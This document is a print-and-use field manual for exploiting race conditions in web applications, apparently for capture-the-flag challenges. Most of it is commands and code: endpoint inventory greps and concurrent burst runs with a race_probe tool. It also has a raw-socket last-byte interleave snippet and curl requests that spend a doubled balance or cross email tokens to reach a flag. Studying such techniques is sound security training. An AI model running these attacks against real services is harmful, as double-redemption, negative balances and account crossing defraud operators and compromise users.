# Field manual — the operational reference for running a race end-to-end

The practical how-to for a real engagement: set up, measure, deliver, read,
attribute, record. Print-and-use.

---

## 1. Setup — the environment contract

```bash
export BASE="https://target.ctf"
export SESSION="session=your-cookie"
export NAME="challenge-name"

# the object you own — never a shared/demo resource
export CODE="YOUR-CODE-123"          # your redeem code
export ACCT="you@yourdomain"          # your account
```

Verify the target is reachable and the object is fresh before spending a
single probe.

## 2. The endpoint inventory — pick the checked write

```bash
# every state-changing endpoint that has a check
grep -rhoE '"/(api/)?[a-z0-9_/-]+"' /tmp/bundle | sort -u | grep -iE \
  '(redeem|buy|vote|transfer|withdraw|verify|book|claim|register|order|reset|invite|pay|use|spin|join|bid|convert|refund|accept|submit)'
```

Rank by flag-proximity: money → token → account → limit → vote.

## 3. The window check — is there a gap?

```bash
# source: a read and a write on the same record with work between
grep -rnE '(SELECT|\.get\(|findOne|QueryRow)' "$SRC" -A 10 \
  | grep -B2 -A6 -E '(UPDATE|INSERT|commit|save|Exec|send|email|render)'

# schema: is the check backed by a constraint?
grep -rniE '(unique|constraint|check\s*\()' "$SRC"/**/migrations "$SRC"/**/*.sql 2>/dev/null

# transaction: is the read locked?
grep -rnE '(FOR UPDATE|select_for_update|SERIALIZABLE|with_for_update)' "$SRC"
```

Code-only check + no constraint = the window can't close at the DB — race it.

## 4. The serial baseline — always first

```bash
python3 tools/web/race_probe.py --url "$BASE/api/redeem" \
  --method POST --body "{\"code\":\"$CODE\"}" -H "Cookie: $SESSION" \
  --baseline-count 5 --count 0 --no-barrier --challenge "$NAME"
```

Expected: `[200, 409, 409, 409, 409]` — one success, the rest the
"already-used" decline. This is the calibration.

## 5. The raced run

```bash
python3 tools/web/race_probe.py --url "$BASE/api/redeem" \
  --method POST --body "{\"code\":\"$CODE\"}" -H "Cookie: $SESSION" \
  --concurrency 20 --count 20 --baseline-count 5 \
  --signature-mode status --write-ack --challenge "$NAME"
```

Read: `max_in_flight` (≥ 2 = real overlap), the status split, vs baseline.

## 6. The state read — the crossed state

```bash
# the doubled effect, read back
curl -s -b "$SESSION" "$BASE/api/account" | python3 -m json.tool | grep -iE '(balance|points|count|claimed|votes)'
curl -s -b "$SESSION" "$BASE/api/inventory" | python3 -m json.tool | grep -iE '(item|count)'
```

The crossed state is in the state read — two grants, a negative balance, a
double vote — not in the status codes.

## 7. The two-request form — `--url-b`

For a race between two different requests (a token-cross, a read-vs-write):

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/profile"  --method POST --body '{"email":"a@yourdomain"}' -H "Cookie: $SESSION" \
  --url-b "$BASE/profile" --method-b POST --body-b '{"email":"b@yourdomain"}' \
  --concurrency 2 --count 10 --baseline-count 4 \
  --signature-mode normalized-body --write-ack --challenge "$NAME"
```

The cross is in the *mailbox* or the downstream read, not the response.

## 8. The interleave — a narrow window

When the burst misses the window, hold A open:

```python
import socket, ssl
ctx = ssl.create_default_context()

def prime(req_minus_last):
    s = ctx.wrap_socket(socket.create_connection((HOST,443)), server_hostname=HOST)
    s.sendall(req_minus_last)
    return s

A = prime(A_head)          # A's handler starts; its last byte is withheld
B = ctx.wrap_socket(socket.create_connection((HOST,443)), server_hostname=HOST)
B.sendall(B_full)          # B lands inside A's window and commits
A.sendall(A_last_byte)     # release A — it re-reads and sends
```

The stall keeps A's handler in-flight while B commits — the ApexSurvive
mechanic.

## 9. The result-decision

| Observation | Verdict | Action |
|---|---|---|
| `max_in_flight` ≥ 2, crossed state | confirms | attribute, verify the effect |
| `max_in_flight` = 1 | inconclusive | fix delivery, re-roll |
| real overlap, all-losers, no cross | falsifier | record, move endpoint |
| `429`/`403` dominant | throttled | race the limiter or interleave |
| timeout on a slot | unknown | discard, re-roll |

## 10. The effect verification

The crossed state is a primitive. Verify what it bought:

```bash
curl -s -b "$SESSION" -X POST "$BASE/api/buy" -d '{"item":"flag_item"}'   # the purchase the balance gate blocked
curl -s -b "$SESSION" "$BASE/api/order/1"                                  # the item / receipt / flag
curl -s -b "$SESSION" -X POST "$BASE/api/login" -d '{"email":"student@domain","password":"yours"}'  # the owned account
```

## 11. The record

```bash
python3 tools/hooks.py post-probe "$NAME" --class web-race-condition \
  --hypothesis-id <h> --verdict confirms --evidence-kind impact \
  --evidence "raced [200×2,409×18] vs baseline [200,409×4], max_in_flight=20; GET /api/account balance=-100" \
  --response "<the tool output + the state read the excerpt came from>"
```

## 12. The reset — for re-rolls

```bash
# restore the starting state between rolls
python3 tools/web/race_probe.py --url "$BASE/api/redeem" \
  --reset-url "$BASE/api/reset" --reset-method POST --reset-body '{"code":"fresh"}' \
  --concurrency 10 --count 10 --baseline-count 3 --write-ack --challenge "$NAME"
```

`--reset-url`/`--reset-method`/`--reset-body` puts the object back so each
roll starts from the same S.

## 13. The abort conditions

- `max_in_flight` can't be raised past 1 → the layer can't overlap; race the
  DB or another tier.
- 3 clean real-overlap runs, all-loser shape, no cross → falsifier; move on.
- the target is shared and a one-shot resource is already consumed → stop;
  the instance is unrecoverable.

## 14. The signature-mode cheat-sheet

| The difference is in | `--signature-mode` |
|---|---|
| the status code | `status` |
| status + length | `status-length` |
| the raw body | `raw-body` |
| the body minus timestamps/ids | `normalized-body` |
| a regex match | `regex` + `--signature-regex` |
| a header (Set-Cookie, Location) | `--signature-header NAME` |
| first N bytes | `--signature-bytes N` |

## 15. The one-page flow

```text
inventory → window check (gap? constraint?) → falsifier check →
baseline (serial) → raced run → max_in_flight → status split →
state read (crossed?) → attribute pair → verify effect → record →
re-roll or falsifier
```
